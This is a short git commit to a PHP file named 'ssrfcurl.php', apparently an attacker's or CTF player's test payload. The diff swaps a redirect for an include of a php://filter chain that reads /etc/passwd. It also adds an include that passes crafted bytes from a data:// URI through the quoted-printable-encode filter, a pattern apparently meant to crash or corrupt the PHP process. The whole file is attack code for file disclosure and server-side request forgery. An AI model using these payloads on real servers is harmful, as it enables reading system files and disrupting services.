e0ae49be3f9a7f19a1ba3848e4472a26d65de139
anyquestions69 <danil_tyrenko@icloud.com>
2023-06-04 16:13:47 +0300

    rwf

--- ssrfcurl.php
+++ ssrfcurl.php
@@ -1,3 +1,4 @@
 <?php
-     header('location:php://filter/string.strip_tags/resource=/etc/passwd');
+     include("php://filter/string.strip_tags/resource=/etc/passwd");
+     include("php://filter/convert.quoted-printable-encode/resource=data://,%bfAAAAAAAAAAAAAAAAAAAAAAA%ff%ff%ff%ff%ff%ff%ff%ffAAAAAAAAAAAAAAAAAAAAAAAA");
 ?>
